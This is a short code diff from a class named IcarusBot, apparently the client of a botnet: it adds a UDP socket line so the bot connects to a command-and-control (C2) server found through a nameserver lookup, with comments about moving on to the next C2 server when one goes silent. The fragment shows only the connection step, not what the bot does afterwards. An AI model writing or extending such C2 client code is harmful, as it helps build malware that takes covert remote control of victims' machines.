@@ -60,6 +60,7 @@ class IcarusBot:
                     nameserver_available = True
                 time.sleep(5)
             # Now that we've got the C2 server IP, let's go ahead and setup the socket for connecting.
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
             self.sock.connect((self.c2_server_details[0], int(self.c2_server_details[1])))
             self.main_loop()
             # This means that the C2 server has been inactive, so we restart the process of searching for the next C2 server.
